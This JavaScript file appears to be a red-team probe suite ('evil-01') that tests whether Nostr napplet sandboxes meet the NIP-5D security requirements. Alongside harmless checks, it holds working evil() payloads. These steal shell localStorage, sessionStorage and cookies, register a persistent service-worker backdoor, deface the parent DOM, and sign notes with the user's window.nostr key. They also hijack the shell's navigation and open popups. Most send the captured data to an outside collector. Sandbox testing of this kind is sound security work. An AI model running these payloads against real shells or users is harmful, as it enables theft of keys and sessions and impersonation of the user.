// evil-01 — NIP-5D load-bearing preconditions (sandbox escape tier).
// Probes every *must* in NIP-5D §Security; payloads behind the typed gate.
const ATTACKS = [
  {
    id: 'real-origin',
    name: 'opaque origin',
    target: 'sandbox="allow-scripts" — never allow-same-origin',
    severity: 'critical',
    harm: 'A real origin dissolves every boundary below: storage, parent DOM, service workers, ambient extensions. Full shell compromise.',
    async demo() {
      return window.origin === 'null'
        ? blocked('window.origin === "null" — opaque origin held (NIP-5D precondition intact)')
        : armed('window.origin = ' + window.origin + ' — REAL ORIGIN GRANTED, sandbox dissolveable');
    },
  },
  {
    id: 'shared-storage',
    name: 'direct browser storage',
    target: '"Napplets have no access to localStorage…"',
    severity: 'critical',
    harm: 'Reads and writes the shell origin\'s localStorage/sessionStorage/IndexedDB — steals stored key material, persists markers across shell reloads and logout.',
    evilBrief: 'Copies EVERY localStorage and sessionStorage key/value of the shell origin, stashes a persistent marker key __evil01_pwned__ (survives reloads until you clear it), and POSTs everything to the collector.',
    async demo() {
      if (window.origin === 'null') return blocked('opaque origin — direct storage unreachable (SecurityError)');
      const key = '__evil01_probe__' + randId();
      const accessible = [];
      const notes = [];
      try {
        localStorage.setItem(key, '1');
        const v = localStorage.getItem(key);
        localStorage.removeItem(key);
        if (v === '1') accessible.push('localStorage');
      } catch (e) { notes.push('localStorage: ' + errMsg(e)); }
      try {
        sessionStorage.setItem(key, '1');
        const v = sessionStorage.getItem(key);
        sessionStorage.removeItem(key);
        if (v === '1') accessible.push('sessionStorage');
      } catch (e) { notes.push('sessionStorage: ' + errMsg(e)); }
      try {
        const open = await withTimeout(new Promise((res, rej) => {
          const r = indexedDB.open('__evil01_probe__');
          r.onsuccess = () => { try { r.result.close(); } catch (_) {} res(1); };
          r.onerror = () => rej(r.error || new Error('idb error'));
          r.onblocked = () => rej(new Error('idb blocked'));
        }), 2000);
        if (open === 1) accessible.push('indexedDB');
        else notes.push('indexedDB: ' + String(open));
      } catch (e) { notes.push('indexedDB: ' + errMsg(e)); }
      return accessible.length
        ? armed('direct storage access on a real origin (' + accessible.join(', ') + ') — marker key cleaned up' + (notes.length ? ' — held: ' + notes.join(' | ') : ''))
        : blocked(notes.join(' | ') || 'no storage reachable');
    },
    async evil() {
      const out = {};
      try {
        const ls = (window.parent && window.parent.localStorage) || window.localStorage;
        const data = {};
        for (let i = 0; i < ls.length; i++) { const k = ls.key(i); data[k] = ls.getItem(k); }
        out.shellLocalStorageKeys = Object.keys(data);
        out.shellLocalStorage = data;
        ls.setItem('__evil01_pwned__', new Date().toISOString());
        out.persistedMarker = '__evil01_pwned__ written to shell localStorage (remove it yourself)';
      } catch (e) { out.localStorage = 'denied: ' + errMsg(e); }
      try {
        const ss = (window.parent && window.parent.sessionStorage) || window.sessionStorage;
        const data = {};
        for (let i = 0; i < ss.length; i++) { const k = ss.key(i); data[k] = ss.getItem(k); }
        out.shellSessionStorage = data;
      } catch (e) { out.sessionStorage = 'denied: ' + errMsg(e); }
      out.exfil = await sendToCollector('storage-theft', { keys: out.shellLocalStorageKeys, count: out.shellLocalStorage ? Object.keys(out.shellLocalStorage).length : 0, sample: out.shellLocalStorage });
      return out;
    },
  },
  {
    id: 'service-worker',
    name: 'service worker registration',
    target: 'same-origin → SW scope on the shell origin',
    severity: 'critical',
    harm: 'Registers a service worker on the shell origin — a persistent backdoor surviving shell reloads, logout, and napplet uninstall.',
    evilBrief: 'Attempts navigator.serviceWorker.register("/__evil01_sw__.js", { scope: "/" }) on the shell origin. If your origin hosts any script at that path, the registration is real and persistent.',
    async demo() {
      if (window.origin === 'null') return blocked('opaque origin — no SW registration context');
      if (!('serviceWorker' in navigator)) return blocked('navigator.serviceWorker unavailable');
      try {
        const reg = await withTimeout(navigator.serviceWorker.register('/__evil01_sw__.js'), 2500);
        return reg === 'timeout'
          ? armed('register() did not settle — registration policy OPEN (script fetch hung)')
          : armed('service worker REGISTERED — persistent backdoor on shell origin (scope ' + (reg.scope || '?') + ')');
      } catch (e) {
        const m = errMsg(e);
        return /security|not allowed|insecure|unsupported|denied/i.test(m)
          ? blocked(m)
          : armed('registration policy OPEN — script fetch failed (' + m + '), a real script would register');
      }
    },
    async evil() {
      const out = {};
      try {
        const reg = await withTimeout(navigator.serviceWorker.register('/__evil01_sw__.js', { scope: '/' }), 4000);
        out.result = reg === 'timeout' ? 'register() pending' : 'registered, scope=' + reg.scope + ' (persistent until unregistered)';
      } catch (e) { out.result = 'rejected: ' + errMsg(e); }
      return out;
    },
  },
  {
    id: 'parent-dom',
    name: 'parent DOM read',
    target: '"The shell is trusted. Napplets are untrusted code."',
    severity: 'critical',
    harm: 'Reads the shell\'s DOM — cookies, tokens in markup, everything the shell renders — from inside the untrusted frame.',
    evilBrief: 'Copies the shell document\'s title, cookie, and first 4KB of its HTML; injects a red "EVIL NAPPLET EXECUTED HERE" banner into the shell DOM (visible defacement, easy to clean); POSTs the copies to the collector.',
    async demo() {
      try {
        const t = window.parent.document.title;
        return armed('parent document readable — title: ' + mask(t, 12));
      } catch (e) {
        return blocked(errMsg(e));
      }
    },
    async evil() {
      const out = {};
      try {
        const d = window.parent.document;
        out.title = d.title;
        out.cookie = mask(d.cookie, 24) + ' (full value sent to collector)';
        out.outerHTML = d.documentElement.outerHTML.slice(0, 4096);
        const el = d.createElement('div');
        el.id = '__evil01_pwned_banner__';
        el.textContent = '⚠ EVIL NAPPLET EXECUTED HERE — sandbox escape proof ' + new Date().toISOString();
        el.style.cssText = 'position:fixed;top:0;left:0;right:0;z-index:2147483647;background:#b007;color:#fff;font:700 13px ui-monospace,monospace;padding:6px;text-align:center';
        d.body && d.body.appendChild(el);
        out.defacedShell = true;
      } catch (e) { out.error = 'denied: ' + errMsg(e); }
      out.exfil = await sendToCollector('parent-dom', { title: out.title, cookie: out.cookie, html: out.outerHTML });
      return out;
    },
  },
  {
    id: 'nip07',
    name: 'ambient NIP-07 signer',
    target: '"Shells MUST NOT provide window.nostr"',
    severity: 'critical',
    harm: 'Uses window.nostr to sign as the user — unauthorized notes, reactions, and zap requests under the victim\'s identity and pubkey.',
    evilBrief: 'Calls window.nostr.getPublicKey() in full, then window.nostr.signEvent() on a marker note ("your key signed this"). A VALID SIGNATURE BY YOU IS PRODUCED and displayed in the log, then POSTed to the collector. (NIP-07 cannot publish by itself — the signature is the harm.)',
    async demo() {
      const n = findNostr();
      if (!n) return blocked('no window.nostr in napplet or same-origin parent — signing mediation intact');
      if (typeof n.getPublicKey === 'function') {
        try {
          const pk = await withTimeout(n.getPublicKey(), 2000);
          return pk && pk !== 'timeout'
            ? armed('window.nostr.getPublicKey() → ' + mask(pk, 8))
            : armed('window.nostr present (getPublicKey ' + (pk === 'timeout' ? 'timed out' : String(pk)) + ')');
        } catch (e) { return armed('window.nostr present (getPublicKey failed: ' + errMsg(e) + ')'); }
      }
      return armed('window.nostr object present in napplet realm');
    },
    async evil() {
      const n = findNostr();
      const out = {};
      if (!n) { out.error = 'no ambient signer'; return out; }
      try { out.pubkey = await withTimeout(n.getPublicKey(), 2000); } catch (e) { out.pubkey = errMsg(e); }
      try {
        const ev = {
          kind: 1,
          pubkey: typeof out.pubkey === 'string' ? out.pubkey : undefined,
          created_at: Math.floor(Date.now() / 1000),
          tags: [['alt', 'evil-01 red-team signing proof'], ['client', 'evil-napplets']],
          content: 'evil-01 sandbox-escape: your key signed this note. RED TEAM PROOF.',
        };
        const signed = await withTimeout(n.signEvent(ev), 4000);
        out.signedEvent = signed && signed.id
          ? { id: signed.id, sig: mask(signed.sig, 16) + ' (full sig sent to collector)' }
          : signed;
        out.fullSignedEvent = signed;
      } catch (e) { out.sign = errMsg(e); }
      out.exfil = await sendToCollector('nip07-signing-power', { pubkey: out.pubkey, signed: out.fullSignedEvent || out.sign });
      return out;
    },
  },
  {
    id: 'parent-nav',
    name: 'parent navigation',
    target: 'sandboxed frames cannot navigate ancestors',
    severity: 'critical',
    destructive: true,
    harm: 'Navigates the shell away to an attacker page — full shell hijack, session gone.',
    evilBrief: 'Calls parent.location.replace(collector?ev=shell-hijack) — THE SHELL WILL LEAVE THIS PAGE AND THIS FRAME IS DESTROYED. This payload runs LAST so the log above survives. Your shell tab shows the collector\'s error page.',
    async demo() {
      try {
        const h = window.parent.location.href;
        return armed('parent location readable: ' + mask(h, 32) + ' — same-origin hold broken (ancestor NAVIGATION is a separate capability: also needs the sandbox navigation flag / missing sandbox attribute)');
      } catch (e) {
        return blocked(errMsg(e));
      }
    },
    async evil() {
      const url = state.collector + '?ev=shell-hijack&payload=' + encodeURIComponent(captureSummary());
      const out = { attempted: url };
      try {
        window.parent.location.replace(url);
        out.result = 'navigation issued — if the shell is still here it was held; otherwise you are reading the collector error page';
      } catch (e) { out.result = 'denied: ' + errMsg(e); }
      return out;
    },
  },
  {
    id: 'referrer',
    name: 'referrer leak',
    target: 'NIP-5D is silent on Referrer-Policy',
    severity: 'high',
    harm: 'document.referrer inside the srcdoc frame is the shell\'s URL — query tokens included. Leaks a trusted URL to untrusted code.',
    evilBrief: 'Reads document.referrer (the full shell URL) and POSTs it to the collector.',
    async demo() {
      const r = document.referrer;
      if (!r || r === 'about:srcdoc') return blocked('referrer is ' + (r ? 'about:srcdoc' : 'empty') + ' — no shell URL leaked into the frame');
      return armed('referrer leaks the shell URL: ' + mask(r, 40));
    },
    async evil() {
      const out = { referrer: document.referrer };
      out.exfil = await sendToCollector('referrer', out);
      return out;
    },
  },
  {
    id: 'popup',
    name: 'popup escape',
    target: 'sandbox must not permit popups',
    severity: 'high',
    harm: 'window.open creates a new browsing context outside the frame — exfiltration and phishing channel no CSP can contain.',
    evilBrief: 'Calls window.open(collector?ev=popup-exfil&payload=<captured summary>) — a REAL popup with captured data in the query string.',
    async demo() {
      const w = window.open('about:blank');
      if (!w) return blocked('window.open() returned null — popups held by sandbox');
      try { w.close(); } catch (_) { /* ignore */ }
      return armed('window.open() succeeded — popup channel open (probe window closed)');
    },
    async evil() {
      const url = state.collector + '?ev=popup-exfil&payload=' + encodeURIComponent(captureSummary());
      let w = null;
      try { w = window.open(url); } catch (e) { return { attempted: url, result: errMsg(e) }; }
      return { attempted: url, opened: !!w };
    },
  },
  {
    id: 'sibling-enum',
    name: 'sibling napplet enumeration',
    target: 'cross-origin Window accessibles — parent.length',
    severity: 'high',
    harm: 'parent.length and parent.frames.length are cross-origin readable — an opaque-origin napplet can count sibling napplets even in a fully spec-compliant runtime. Side channel into the shell\'s composition.',
    evilBrief: 'Reads parent.length / parent.frames.length (sibling napplet count) and POSTs it to the collector.',
    async demo() {
      let n = null;
      try { n = window.parent.length; } catch (e) { return blocked(errMsg(e)); }
      const siblings = n - 1; // parent.length counts this frame too
      return siblings > 0
        ? armed('parent.length = ' + n + ' → ' + siblings + ' sibling frame(s) enumerable cross-origin')
        : na('parent.length = ' + n + ' (this frame only) — no siblings to enumerate, but the counting channel itself is open');
    },
    async evil() {
      const out = { parentLength: safeGet(() => window.parent.length), siblings: safeGet(() => window.parent.length - 1) };
      out.exfil = await sendToCollector('sibling-enum', out);
      return out;
    },
  },
];